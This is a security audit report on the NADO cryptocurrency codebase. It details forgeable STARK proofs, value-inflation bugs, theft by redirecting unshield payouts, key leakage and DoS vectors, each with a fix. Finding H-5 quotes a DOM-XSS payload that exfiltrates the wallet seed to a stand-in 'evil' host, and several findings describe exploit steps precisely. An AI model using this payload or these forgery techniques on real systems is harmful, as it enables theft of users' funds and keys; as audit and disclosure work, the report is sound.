# NADO deep security audit — 2026-07-02

**Scope:** whole codebase, with emphasis on the code developed since the 2026-06-30 consensus audit — the field-native (STARK) shielded pool, the execution node, the browser light-miner, and the L1↔exec settlement bridge.
**Method:** five parallel deep-read passes (exec/shielded value integrity, client, RPC/P2P surface, consensus + settlement, crypto primitives), each instructed to report only adversarially-verified findings. Every CRITICAL/HIGH below was then independently re-verified against the source; the shielded-pool breaks were confirmed with runnable proof-of-concept forgeries against the real verifier.
**Status of the tree:** pre-mainnet alpha, no value at stake. These are **launch blockers**, not live incidents.

---

## Bottom line

- **The field-native (STARK) shielded pool is fundamentally unsound.** There are **three independent** ways to create coins from nothing and one way to steal another user's exit. Any one of them fully breaks it. It must not be deployed with value until all are fixed.
- **The L1 consensus core is sound.** All 2026-06-30 fixes hold; the direct L1 unshield-claim path (proof against the settled root + persisted nullifier + escrow floor) is correctly enforced.
- **The transparent (BLAKE2b) shielded pool is largely sound** — exact big-integer value conservation and per-input signature binding — *except* the shared `withdraw_addr` theft vector (HIGH-4) and the shared alghash width issue.
- **The browser client has two HIGH bugs**: a hostile relay can steal the (default-plaintext) seed via DOM-XSS, and "prove on this device" silently ships the shielded spend key to the node on any error.

---

## CRITICAL

### C-1 — STARK/FRI verifier accepts a proof with zero queries → forge any shielded transfer
**`execnode/stark/fri.py:85-141`, `execnode/stark/stark.py:112-158`.**
`num_queries` is a *prover-only* parameter; the verifier never enforces a minimum. `fri.verify` reads `queries = proof["queries"]` and loops over it — every Merkle-opening and fold-consistency check lives *inside* that loop. `stark.verify`'s boundary/constraint checks (which bind `root`, `nf`, the output commitments, and value conservation to the trace) live inside `for q, op in zip(proof["fri"]["queries"], proof["openings"])`. Supply `queries=[]`, `roots=[]`, `final=[0]` and **every check is skipped**; the only surviving test (final-layer low-degree) passes trivially on `[0]`. Verifier returns `(True, "ok")`.

Reachable unauthenticated via `POST /exec/apply_field_transfer` (`execnode.py:310`), `POST /exec/prove_transfer[2]`, and the L1 `field_transfer` blob path. On acceptance, `apply_field_transfer` (`state.py:214-216`) records the attacker's arbitrary nullifier and appends the attacker's arbitrary output commitments as real notes → mint from nothing, then unshield to drain `SHIELD_ESCROW`.

**PoC (verified):** a hand-crafted empty-query proof with arbitrary `nf`/`cm1`/`cm2` makes the real `joinsplit2.verify_transfer(...) → (True,'ok')`. Honest proofs still verify and tampering an honest proof is still caught — the break is specifically the degenerate FRI geometry.

**Fix:** derive FRI geometry from the AIR, not the proof: fix `blowup`, require `len(final) ≤ blowup`, require the layer count and `len(openings)==len(queries)`, and enforce a hardcoded minimum `len(queries)` sized to the target soundness (~100 bits). Draw query indices from the transcript up to that fixed count instead of iterating a prover-supplied list.

### C-2 — Field-shield mints a note whose value is never bound to the L1 deposit
**`execnode/state.py:186-192`, `execnode/execnode.py:103-108`.**
For a field-native shield, the exec node does `apply_field_shield(d.get("cm"))` → `self.field_pool.append(int(cm))` and **never sees `tx.amount`**. The transparent path (`apply_shield(amount, …)`) binds output values to the escrowed amount; the field path does not. Escrow 1 coin on L1, submit a `shield` whose `cm` commits a note worth 10¹⁸, then unshield it. Direct inflation, independent of C-1.

**Fix:** bind the note value to the escrow at shield time — make the field-shield a proven 0-input join-split with `public_value == amount`, or require an opening proving `cm` commits exactly `amount`.

### C-3 — Modular value conservation + raw signed `public_value` → wraparound inflation via the *honest* prover
**`execnode/state.py:217,224`; circuit `execnode/stark/joinsplit2.py:230,244` (and `joinsplit_circuit.py:212,227`).**
The circuit constrains only `public_value % P` (`cons_pub = fee%P − public_value%P`), but the state pays out the raw signed integer: `pv = int(js["public_value"])`, `unshield_withdrawals[nonce] = {"amount": -pv}`. Set `public_value = -P` (P = 18446744069414584321): the circuit sees `0` — a balanced spend an honest note satisfies — so the honest delegated prover produces a *valid* proof, and the state records an unshield of `P` coins. Generalises to `-k·P` (unbounded) and, via 2-output conservation, to minting an in-pool note ≈ P. Only precondition: owning one small legit note. Survives fixing C-1 and C-2.

**Fix:** in-circuit range constraints `0 ≤ value < 2^k` on all note values, and state-side bounds on `public_value`/`fee` with a check that `-pv` equals the residue the circuit actually constrained.

---

## HIGH

### H-4 — Unshield destination (`withdraw_addr`) is not bound to the proof → front-run / redirect theft
**`execnode/state.py:219,340`; `execnode/shielded.py:74-81`.**
`withdraw_addr` sits outside the STARK statement and outside `transfer_sighash` (which binds nullifiers/commitments/public_value/fee but not the address). Observe a victim's unshield bundle (mempool/L1), copy it verbatim, change only `withdraw_addr` to your own, and land first: the proof/signature still verify and the nullifier is still unspent, so your copy applies and the settled leaf becomes `unshield_leaf(your_addr, amount, nonce)` — the victim (whose `addr != leaf addr`) can no longer claim. Amount is bound; payee is not.
**Fix:** bind `withdraw_addr` into `transfer_sighash` (transparent) and as a STARK public input/boundary (field).

### H-5 — Client DOM-XSS from relay JSON steals the (default-plaintext) seed
**`static/miner.js:1182` (`renderLanes`), plus the explorer/swap sinks at `2026/2029/2045/2046/2084/2091/2102/2113/2469`.**
`$("myShare").innerHTML` interpolates raw `/mining_status` fields (`my_open_weight`, `total_open_weight`, `open_registry_size`, …) with no escaping or numeric coercion — and it runs on **every poll**. A hostile relay (the relay URL is user-settable; plain-http relays are MITM-able) returns `"my_open_weight":"<img src=x onerror=fetch('//evil/'+localStorage.nado_miner_wallet)>"` and exfiltrates the plaintext ML-DSA seed (wallet encryption is opt-in) → total loss. Several explorer sinks share the class.
**Fix:** escape at the sinks and `Number(...)`-coerce numeric fields; add a strict CSP (`connect-src 'self' <relay/exec>`, no inline scripts); consider encrypt-at-rest by default.

### H-6 — "Prove on this device" silently ships the shielded spend key to the node on any error
**`static/miner.js:2691-2698` (`proveTransfer2`; dead `proveTransfer` at 2635 has the same flaw).**
With the "fully private" box ticked, if `window.nadoProve2` throws, the `catch` is silent and execution falls through to `POST /exec/prove_transfer2` with the **entire witness including `nsk`** (the stable per-wallet spend key). Very reachable: the on-device prover throws "note not in pool yet" right after a deposit/send. A malicious or curious exec node that receives `nsk` (plus the `(value, rho)` it also gets) can spend the wallet's notes.
**Fix:** when the box is ticked, fail closed — surface the error and stop; only delegate when it's unticked (or behind an explicit "the node will see your keys" confirmation).

### H-7 — Exec node: unauthenticated, unbounded proving DoS
**`execnode/execnode.py:256,344` → `stark`/`fri`.**
`num_queries=int(w.get("num_queries", 24))` is taken from the request with no clamp; every `/exec/*` endpoint is unauthenticated and unthrottled, and each `apply`/`prove` call forces a full `state.save()`. One request with `num_queries=100000000`, or a flood of default requests, exhausts CPU/memory. (Also: the "read-only query API" comment is wrong — three POST endpoints mutate state.)
**Fix:** ignore the client value and clamp to a fixed constant; rate-limit + cap all exec POSTs; bind the exec API to loopback by default.

---

## MEDIUM

- **M-8 — Snapshot bootstrap drops all auxiliary consensus state** (`ops/snapshot_ops.py:40-70,152-198`; `loops/core_loop.py:440-502`). The snapshot root commits balances only; the tail replay never rebuilds shield/bridge/dividend **nullifiers**, settlement attestations, unbond-pending, HTLC/slash records, or open-lane registration. A snapshot-synced node can pay an already-claimed `(addr,nonce)` out of escrow again (double-spend) and reject blocks the network accepted (fork/stall). Contingent on the snapshot fast-sync path being enabled. **Fix:** commit every consensus sub-DB into the snapshot root and import them, or require full `reindex.py` replay until the format is complete. (`reindex_fast.py` is also incomplete and already marked "do not use.")
- **M-9 — No L1 value-conservation cap on the bridge** (`ops/transaction_ops.py:502-503,522-523,588-589`). Each exit checks only per-tx `pool.balance ≥ amount`; nothing asserts cumulative-out ≤ cumulative-in per pool, so a dishonest 2/3-bonded quorum (or an exec bug — e.g. any CRITICAL above) drains the shared escrow up to its balance. **Fix:** per-pool cumulative in/out counters, assert out ≤ in on every exit (cheap, quorum-independent).
- **M-10 — TOCTOU double-spend on the field pool** (`execnode/state.py:212-216`; `execnode.py:318` runs apply via `asyncio.to_thread`). `has_nullifier` → `nullifiers.add` is non-atomic under aiohttp concurrency; two concurrent identical bundles can both pass. Concurrent `state.save()` can also corrupt the state file. **Fix:** one lock serializing verify+mutate+save.
- **M-11 — alghash is a single ~64-bit field element** (`execnode/stark/alghash.py:45-61`). `commit`/`nullifier`/`owner_of`/`merkle_node` each output one Goldilocks element → ~2³² collision, ~2⁶⁴ preimage. A commitment collision opens one note as two values (mint); an `owner_of` preimage forges a spend key (theft). The S-box/round constants are fine — the limiter is the **width**. **Fix:** widen the sponge (capacity ≥ 4 elements) and emit a ≥128-bit multi-element digest.
- **M-12 — `server_key` (and tx nonces) from Mersenne Twister** (`hashing.py:8-10`; `config.py:62`). `create_nonce` uses `random.choice`, not a CSPRNG; `server_key` gates `/terminate`, `/force_sync` (eclipse), `/health`, `/log`, and the same `random` stream produces on-chain tx nonces (MT state is recoverable from ~624 outputs). **Fix:** `secrets.token_hex(32)` for the key (and ideally nonces).
- **M-13 — Shielded spend key `nsk` has only ~64-bit entropy** (`static/miner.js:2521`: `nsk = H(seed) % P`, P ≈ 2⁶⁴). Ownership rests on ~64-bit preimage resistance of a software hash. Scheme-level fix: bind spend authority to a full ≥128-bit key over multiple field limbs.
- **M-14 — Core client crypto can fall back to a CDN with no SRI** (`static/miner.js:54-87`). If the vendored bundle fails to load, keygen/sign import from `esm.sh`/jsdelivr with no integrity check. **Fix:** make the vendored bundle mandatory (hard-fail) or add an import-map + hash check.
- **M-15 — L1 pool-dump handlers serialize on the event loop, unauthenticated** (`nado.py:127-130`). `/transaction_pool`, `/transaction_buffer`, `/user_transaction_buffer` pack up to the full mempool synchronously on the loop (unlike the DB handlers, which use `to_thread`), stalling all request handling. **Fix:** move `serialize` into `to_thread`, rate-limit, cache per pool-hash.

---

## LOW / hardening

- **L-16 — Intra-block escrow oversubscription wedges the slot** (`ops/transaction_ops.py:588-589`; `account_ops.py:171`). Exits are validated only vs parent escrow; a block summing beyond a pool makes `incorporate_block` raise (it's contracted not to). Deterministic (no fork) but wastes the slot. **Fix:** model per-pool escrow depletion in `verify_block`/assembly.
- **L-17 — Settlement/bridge Merkle has no leaf/node domain separation** (`hashing.py:50-63`). The primitive allows a 64-byte "leaf" to collide with an internal node. **Not exploitable on the money paths** — every real leaf is `canonical_bytes(["…_withdrawal", addr, amount, nonce])`, structured JSON that can't byte-equal two concatenated 32-byte digests — but it's fragile. **Fix:** RFC-6962 `0x00`/`0x01` prefixes (as `execnode/stark/merkle.py` already does).
- **L-18 — Shielded send/unshield have no confirm dialog; a `#pay` zpay link focuses the submit button** (`static/miner.js:2703`, `1840`). Enter/Space then sends to the attacker's `znado…` with no review. **Fix:** add a `confirm()` and don't auto-focus submit from a deep link.
- **L-19 — JS `inv(0)` returns 0 where Python raises** (`static/stark/field.js:20` vs `execnode/stark/field.py:31`). Latent consensus-split if a zero denominator ever arises. **Fix:** make JS throw.
- **L-20 — Constrained SSRF via `/announce_peer?ip=`** (`nado.py:452-478`). `check_ip` blocks private/loopback; limited to public IPv4:9173 GET. Acceptable for mainnet; optionally cap distinct targets per window.
- **L-21 — Unbounded big-integer VM DoS via `/exec/view`** (`execnode/vm.py`). Gas bounds step count but not integer width; repeated squaring builds an astronomically wide int. Requires a deployed (fee-gated) contract. **Fix:** cap operand bit-width.

---

## Verified sound (coverage — checked and correctly enforced)

- **All 2026-06-30 consensus fixes hold**: in-block duplicate reserved-tx uniqueness (incl. `unshield`), fork-choice `(weight DESC, hash ASC)` tie-break, `verify_block` always validates sigs+spending (no quick_sync bypass), atomic incorporate/rollback in one txn, monotonic finality floor, **M14** (canonical sorted-key hashing) and **M3** (chain_id in the signed txid) both fixed.
- **Direct L1 unshield-claim path is sound**: `addr==sender`, Merkle proof of `unshield_leaf` against the bonded-quorum settled root, per-`(addr,nonce)` nullifier **persisted on apply and reversed on rollback**, escrow-balance floor. No proof-forgery, recipient-redirect, or cross-fork replay on this path.
- **Transparent (BLAKE2b) pool**: exact big-integer `in_sum + public_value == out_sum + fee` with non-negativity, per-input ML-DSA signature over `transfer_sighash`, membership against a known anchor, in-transfer and persisted double-spend rejection.
- **ML-DSA signatures** (`Curve25519.py`): CSPRNG signing hedge, strict-bool `verify` with no fail-open, deterministic keygen, native-backend interop self-test; `signature` excluded from the txid so re-randomization can't replay.
- **Honest-path STARK**: public inputs bound by verifier-supplied boundary constraints (not read from the proof), correct Fiat-Shamir absorb ordering (trace roots → constraint αs → per-layer fold αs → final → indices), STARK Merkle leaf/node domain-tagged, in-circuit owner binding (`owner_of(nsk)`), membership circuit sibling/direction constraints.
- **Goldilocks field** (Python): correct reduction/inversion (`inv(0)` raises), Montgomery batch inverse, NTT/2-adicity.
- **Client**: `#pay` never auto-sends (prefill + native `confirm()` only); `#claim` is receive-only and **cannot forge a spendable note** (reconstructs with *your* owner, requires the commitment to already exist, writes only localStorage); CSPRNG (`crypto.getRandomValues`) for all keys/IVs/`rho`; AES-256-GCM + PBKDF2-210k at rest; no `eval`/`new Function`/`document.write`; i18n `data-i18n-html` applied via `textContent`; history/rich-list render via `BigInt`+`escapeHtml`. **Claim codes are not bearer-stealable** — spending requires the recipient's secret `nsk`; sharing a code is a *privacy* exposure (reveals the amount + links the claim), not a theft vector.
- **L1 RPC surface**: path traversal fully closed (`is_hex_hash` before every `blocks/{hash}` open), static handler `normpath`+prefix-contained, no unauthenticated state mutation beyond fully-validated `/submit_transaction`, `/health`/`/log`/`/force_sync`/`/terminate` gated by `server_key`-or-loopback (the loopback bypass is not remotely spoofable).

---

## Suggested remediation order

1. **Close the shielded-pool criticals before any value is at stake:** C-1 (verifier query floor + AIR-derived geometry), C-3 (in-circuit value range + signed-`public_value` bound), C-2 (bind field-shield value to the deposit), H-4 (bind `withdraw_addr`). Until all four land, keep the field-native pool disabled on any network with value.
2. **Client HIGH bugs:** H-5 (escape relay JSON + CSP), H-6 (fail-closed on-device proving).
3. **Exec hardening:** H-7 (clamp `num_queries`, auth/rate-limit, loopback bind), M-10 (serialize verify+mutate).
4. **Before enabling snapshot fast-sync:** M-8 (commit aux state) and M-9 (independent per-pool conservation cap).
5. **Scheme-level:** M-11 (widen alghash) and M-13 (full-entropy `nsk`) together; M-12 (`secrets` for `server_key`).
6. The LOWs as cleanup.
